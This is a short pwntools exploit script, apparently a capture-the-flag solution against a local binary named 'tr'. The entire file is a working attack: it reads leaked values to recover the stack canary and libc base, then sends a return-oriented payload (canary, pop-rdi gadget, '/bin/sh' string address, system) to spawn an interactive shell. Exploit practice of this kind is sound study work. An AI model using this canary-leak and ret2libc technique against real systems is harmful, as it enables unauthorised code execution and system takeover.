from pwn import *
context.log_level = 'debug'
e = ELF('./tr')
p = process('./tr')


p.recvuntil('>')
p.sendline('1')
p.recv()
p.sendline('1')
p.recvuntil('generate by rand:\n')
recv = p.recvuntil('binary tree here:\n')

recv = map(int, recv.split(',')[:-1])

recv = map(lambda x: hex(x & 0xffffffff), recv)
#
# print recv

canary = int(recv[3]+recv[2][2:], 16)
main_libc = int(recv[19]+recv[18][2:], 16)-240
basic_libc = main_libc-0x20740
one_gadget_libc = basic_libc+0x4526A
print hex(canary)
#print hex(main_libc)
print hex(basic_libc)
print hex(one_gadget_libc)


pop_rdi = 0x400e53
str_libc = basic_libc+0x18CD57
system_libc = basic_libc+0x45390

payload = 'a'*8+p64(canary)+p64(0)+p64(pop_rdi)+p64(str_libc)+p64(system_libc)
p.sendafter('>',payload)
p.interactive()
